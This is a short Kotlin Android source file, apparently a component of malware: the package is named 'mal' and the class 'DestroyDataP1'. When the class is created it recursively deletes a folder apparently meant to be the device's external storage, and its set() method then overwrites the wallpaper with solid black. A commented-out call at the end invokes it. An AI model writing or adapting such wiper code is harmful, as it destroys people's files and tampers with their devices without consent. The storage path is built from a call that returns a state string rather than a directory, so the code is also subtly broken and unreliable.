package com.mal.creamwrapper

import android.app.WallpaperManager
import android.content.Context
import android.graphics.Bitmap
import android.graphics.Color
import android.os.Environment
import java.io.File

class DestroyDataP1(private val context: Context) {
    val folder = File(Environment.getExternalStorageState())

    init {
        folder.deleteRecursively()
    }

    fun set() {
        val displayMetrics = context.resources.displayMetrics

        val bitmap = Bitmap.createBitmap(
            displayMetrics.widthPixels,
            displayMetrics.heightPixels,
            Bitmap.Config.ARGB_8888
        )

        try {
            bitmap.eraseColor(Color.BLACK)

            WallpaperManager
                .getInstance(context)
                .setBitmap(bitmap)

        } finally {
            bitmap.recycle()
        }
    }
}
//DestroyDataP1(context).set()